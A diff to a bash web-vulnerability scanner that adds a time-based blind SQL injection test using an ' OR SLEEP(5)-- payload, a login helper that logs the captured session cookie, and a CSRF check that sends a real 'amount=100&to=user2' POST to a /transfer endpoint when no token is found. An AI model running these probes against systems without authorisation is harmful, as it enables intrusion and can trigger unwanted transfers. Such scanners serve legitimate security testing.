@@ -147,6 +147,26 @@ test_sqli() {
   done
 }
 
+test_blind_sqli() {
+  local base="$1"
+  local payload="' OR SLEEP(5)-- "
+  local enc; enc=$(urlencode "$payload")
+  local target; target=$(append_query "$base" "id" "$enc")
+
+  local start=$(date +%s)
+  curl_get "$target" >/dev/null
+  local end=$(date +%s)
+
+  local delta=$((end - start))
+  if (( delta >= 5 )); then
+    log "[+] Time-based SQLi detected: $target (Δ=${delta}s)"
+    record_finding "$base" "$target" "sqli_time" "delay:$delta" "$payload"
+  else
+    [[ "$VERBOSE" == "true" ]] && echo "[*] No delay detected (Δ=${delta}s)"
+  fi
+}
+
+
 test_path_traversal() {
   local base="$1"
   for p in "${PATH_TRAV_PAYLOADS[@]}"; do
@@ -168,14 +188,46 @@ test_path_traversal() {
   done
 }
 
+login_and_store_cookie() {
+  local login_url="$1"
+  local user="$2"
+  local pass="$3"
+  local cookie_file="$TMP_DIR/session.cookie"
+
+  curl -s -c "$cookie_file" -X POST "$login_url" \
+    -d "username=$user&password=$pass" --max-time 5 >/dev/null
+
+  COOKIE=$(grep -i 'session' "$cookie_file" | awk '{print $NF}')
+  export COOKIE
+  log "[*] Logged in. Session cookie: $COOKIE"
+}
+
+test_csrf() {
+  local base="$1"
+  local resp=$(curl_get "$base")
+
+  if echo "$resp" | grep -qi 'csrf'; then
+    echo "[*] CSRF token found on page"
+  else
+    echo "[!] No CSRF token detected"
+
+    local post_url="${base}/transfer"
+    local data="amount=100&to=user2"
+    curl -X POST "$post_url" -d "$data" -b "$COOKIE" --max-time 5 >/dev/null && \
+    echo "[+] Possible CSRF vulnerability on $post_url" && \
+    record_finding "$base" "$post_url" "csrf" "no_token" "$data"
+  fi
+}
+
 test_all_for() {
   local url=$1
   test_sqli "$url"
+  test_blind_sqli "$url"
   test_xss "$url"
   test_path_traversal "$url"
   test_cmd_injection "$url"
   test_lfi "$url"
   test_redirect "$url"
   test_idor "$url"
+  test_csrf "$url"
 }
-
